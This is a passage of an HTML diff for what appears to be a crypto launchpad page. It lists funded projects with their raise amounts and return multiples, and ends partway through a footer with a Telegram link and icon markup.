+                                                    <div>71.0 x</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_kingdomx1687783303002.png" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">KingdomX</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 115,000</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 115,000</div>
+                                                    <div>6.0 x</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_1sol1687783302816.png" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">1Sol</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 147,000</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 147,000</div>
+                                                    <div>6.8 x</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_prometheus1687783302719.png" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">Prometheus</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 245,000</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 245,000</div>
+                                                    <div>9.2 x</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_street-runner1687783301542.png" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">Street Runner</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 230,000</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 230,000</div>
+                                                    <div>N/A</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_symbiosis-finance1687783298630.png" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">Symbiosis Finance</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 435,000</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 435,000</div>
+                                                    <div>7.0 x</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_meta-soccer1687783300086.png" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">Meta Soccer</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 295,000</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 295,000</div>
+                                                    <div>5.3 x</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_shopnext1687783299979.png" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">ShopNext</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 130,000</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 130,000</div>
+                                                    <div>N/A</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_bitlocus1687783300259.png" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">BitLocus</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 145,000</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 145,000</div>
+                                                    <div>17.7 x</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_titan-hunters1687783301932.png" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">Titan Hunters</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 95,000</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 95,000</div>
+                                                    <div>48.6 x</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_victoria-vr1687783303225.png" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">Victoria VR</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 100,000</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 100,000</div>
+                                                    <div>208.8 x</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_blockasset1687783302592.png" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">Blockasset</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 105,000</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 105,000</div>
+                                                    <div>12.2 x</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_yin-finance1687783298929.png" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">YIN Finance</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 235,000</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 235,000</div>
+                                                    <div>10.7 x</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_resource-finance1687783301153.png" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">Resource Finance</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 1,220,000</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 1,220,000</div>
+                                                    <div>8.5 x</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_numbers-protocol1687783309005.png" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">Numbers Protocol</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 1,195,000</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 1,195,000</div>
+                                                    <div>63.0 x</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_clearpool1687783300290.png.jpeg" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">Clearpool</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 95,000</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 95,000</div>
+                                                    <div>63.7 x</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_3kingdoms1687783299022.png" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">Three Kingdoms</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 175,000</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 175,000</div>
+                                                    <div>37.6 x</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_dark-frontiers1687783309062.png" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">Dark Frontiers</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 120,000</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 120,000</div>
+                                                    <div>36.4 x</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_heroesempires1687783300358.png" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">Heroes &amp; Empires</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 120,000</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 120,000</div>
+                                                    <div>86.7 x</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_nftrade1687783299698.png" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">NFTrade</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 495,000</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 495,000</div>
+                                                    <div>22.1 x</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_gamefi1687783308998.png" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">GameFi</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 95,000</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 95,000</div>
+                                                    <div>352.2 x</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_kaby-arena1687783299548.png" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">Kaby Arena</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 95,000</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 95,000</div>
+                                                    <div>25.5 x</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_chronicle1687783300392.png" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">Chronicle</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 275,000</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 275,000</div>
+                                                    <div>15.0 x</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_brokoli1687783302513.png.jpeg" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">Brokoli</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 245,000</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 245,000</div>
+                                                    <div>28.6 x</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_coinspaid1687783300045.png" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">Coinspaid</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 95,000</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 95,000</div>
+                                                    <div>9.7 x</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_dinox1687783302644.png" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">DinoX</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 195,000</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 195,000</div>
+                                                    <div>44.4 x</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_derace1666690377083.png.jpeg" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">DeRace</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 355,000</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 355,000</div>
+                                                    <div>164.8 x</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_vent-finance1687783298736.png" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">Vent Finance</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 168,000</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 168,000</div>
+                                                    <div>42.1 x</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_infinity-pad1664795798982.png" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">Infinity Pad</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 100,000</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 100,000</div>
+                                                    <div>5.1 x</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_opulous1687783309010.png" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">Opulous</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 897,000</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 897,000</div>
+                                                    <div>151.2 x</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_formation-fi1687783308993.png" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">Formation Fi</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 200,000</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 200,000</div>
+                                                    <div>14.4 x</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_gamestarter1687783299511.png" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">Gamestarter</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 335,000</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 335,000</div>
+                                                    <div>44.8 x</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_openocean1687783300212.png" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">OpenOcean</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 100,000</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 100,000</div>
+                                                    <div>25.9 x</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_spherium1687783302888.png" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">Spherium</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 190,000</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 190,000</div>
+                                                    <div>3.9 x</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_launchx1687783300079.png" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">LaunchX</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 165,000</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 165,000</div>
+                                                    <div>N/A</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_gold-fever1687783299490.png" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">Gold Fever</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 105,000</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 105,000</div>
+                                                    <div>68.7 x</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_lossless-protocol1687783299265.png" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">Lossless Protocol</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 195,000</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 195,000</div>
+                                                    <div>33.9 x</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_ternoa1687783302646.png" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">Ternoa</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 145,000</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 145,000</div>
+                                                    <div>28.5 x</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_knit-finance1687783300375.png" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">Knit Finance</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 145,000</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 145,000</div>
+                                                    <div>36.0 x</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_bbs-network1687783309075.png" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">BBS Network</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 550,000</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 550,000</div>
+                                                    <div>4.4 x</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_fear-nfts1687783303323.png" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">Fear</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 95,000</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 95,000</div>
+                                                    <div>38.8 x</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_ioi1687783299428.png" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">IOI</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 195,000</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 195,000</div>
+                                                    <div>13.5 x</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_epik1687783302328.png" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">EPIK Prime</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 175,000</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 175,000</div>
+                                                    <div>61.8 x</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_delta-theta1687783302324.png" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">delta.theta</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 300,000</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 300,000</div>
+                                                    <div>5.5 x</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_lever-network1687783299499.png" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">Lever Network</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 95,000</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 95,000</div>
+                                                    <div>10.8 x</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_hord1687783294800.png" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">Hord</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 145,000</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 145,000</div>
+                                                    <div>71.6 x</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_legends-of-crypto1687783294797.png.jpeg" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">Legends Of Crypto</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 81,000</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 81,000</div>
+                                                    <div>18.6 x</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_showcase1687783294794.png" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">Showcase</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 195,000</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 195,000</div>
+                                                    <div>N/A</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_crowny1687783294788.png" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">Crowny</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 145,000</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 145,000</div>
+                                                    <div>34.2 x</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_ispolink1687783299793.png" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">Ispolink</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 95,000</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 95,000</div>
+                                                    <div>11.4 x</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_xcad-network1687783299504.png" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">Xcad Network</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 750,000</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 750,000</div>
+                                                    <div>90.6 x</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_cere-network1687783294781.png" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">Cere Network</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 1,000,000</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 1,000,000</div>
+                                                    <div>19.6 x</div>
+                                                </td>
+                                            </tr>
+                                            <tr class="cursor-pointer border-0 !bg-opacity-50" style="opacity: 1; transform: none;">
+                                                <td class="flex items-center gap-4"><img class="h-12 w-12 rounded-md" src="project_logo_dao-maker1687783294716.png" loading="lazy" alt="" style="opacity: 1;">
+                                                    <div class="text-lg font-bold">DAO Maker</div>
+                                                </td>
+                                                <td class="text-left max-md:hidden">$ 100,000</td>
+                                                <td class="text-right">
+                                                    <div class="md:hidden">$ 100,000</div>
+                                                    <div>87.1 x</div>
+                                                </td>
+                                            </tr>
+                                        </tbody>
+                                    </table>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="btn btn-circle sticky bottom-10 right-10 z-40 place-self-end border-base-content opacity-90"><svg stroke="currentColor" fill="none" stroke-width="0" viewBox="0 0 24 24" class="h-5 w-5" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
+                                <path d="M17.6569 16.2427L19.0711 14.8285L12.0001 7.75739L4.92896 14.8285L6.34317 16.2427L12.0001 10.5858L17.6569 16.2427Z" fill="currentColor"></path>
+                            </svg></div>
+                        <div style="transform: none; transform-origin: 50% 50% 0px;">
+                            <div class="mx-auto flex h-20 items-center justify-between gap-8 px-6 text-sm sm:px-10">
+                                <div class="flex gap-4"><a class="cursor-pointer text-base-content" href="https://t.me/daomaker" target="_blank" rel="noopener"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 32 32" class="h-5 w-5" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
+                                            <path d="M 26.070313 3.996094 C 25.734375 4.011719 25.417969 4.109375 25.136719 4.21875 L 25.132813 4.21875 C 24.847656 4.332031 23.492188 4.902344 21.433594 5.765625 C 19.375 6.632813 16.703125 7.757813 14.050781 8.875 C 8.753906 11.105469 3.546875 13.300781 3.546875 13.300781 L 3.609375 13.277344 C 3.609375 13.277344 3.25 13.394531 2.875 13.652344 C 2.683594 13.777344 2.472656 13.949219 2.289063 14.21875 C 2.105469 14.488281 1.957031 14.902344 2.011719 15.328125 C 2.101563 16.050781 2.570313 16.484375 2.90625 16.722656 C 3.246094 16.964844 3.570313 17.078125 3.570313 17.078125 L 3.578125 17.078125 L 8.460938 18.722656 C 8.679688 19.425781 9.949219 23.597656 10.253906 24.558594 C 10.433594 25.132813 10.609375 25.492188 10.828125 25.765625 C 10.933594 25.90625 11.058594 26.023438 11.207031 26.117188 C 11.265625 26.152344 11.328125 26.179688 11.390625 26.203125 C 11.410156 26.214844 11.429688 26.21875 11.453125 26.222656 L 11.402344 26.210938 C 11.417969 26.214844 11.429688 26.226563 11.441406 26.230469 C 11.480469 26.242188 11.507813 26.246094 11.558594 26.253906 C 12.332031 26.488281 12.953125 26.007813 12.953125 26.007813 L 12.988281 25.980469 L 15.871094 23.355469 L 20.703125 27.0625 L 20.8125 27.109375 C 21.820313 27.550781 22.839844 27.304688 23.378906 26.871094 C 23.921875 26.433594 24.132813 25.875 24.132813 25.875 L 24.167969 25.785156 L 27.902344 6.65625 C 28.007813 6.183594 28.035156 5.742188 27.917969 5.3125 C 27.800781 4.882813 27.5 4.480469 27.136719 4.265625 C 26.769531 4.046875 26.40625 3.980469 26.070313 3.996094 Z M 25.96875 6.046875 C 25.964844 6.109375 25.976563 6.101563 25.949219 6.222656 L 25.949219 6.234375 L 22.25 25.164063 C 22.234375 